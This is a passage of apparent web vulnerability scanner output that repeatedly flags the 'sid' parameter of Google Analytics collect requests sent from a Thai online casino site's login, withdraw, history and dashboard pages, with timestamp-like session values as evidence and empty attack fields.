URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282573161&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dr=https%3A%2F%2Fmember.panama8888b.com%2Fgame&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=4656
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282573161&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dr=https%3A%2F%2Fmember.panama8888b.com%2Fgame&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=1578&tfd=6248
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282573161&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dr=https%3A%2F%2Fmember.panama8888b.com%2Fgame&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=2817&tfd=6247
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282577998&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104527906~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fhistory&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=3331
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282577998&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104527906~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fhistory&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=11974&tfd=19948
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282577998&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104527906~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fhistory&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=1952&tfd=8342
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282596968&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=7166
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282596968&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754286375&sct=5&seg=0&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_ss=1&tfd=3780348
Method	POST
Parameter	sid
Attack	
Evidence	1754286375
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282596968&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754284448&sct=4&seg=0&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&_ss=1&epn.percent_scrolled=90&tfd=1853281
Method	POST
Parameter	sid
Attack	
Evidence	1754284448
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274189852&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=5&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=1143&tfd=34430
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274189852&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754274189&sct=1&seg=0&dl=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=5053&tfd=17813
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274189852&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEEAAAQ&_s=3&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&dt=PANAMA888%20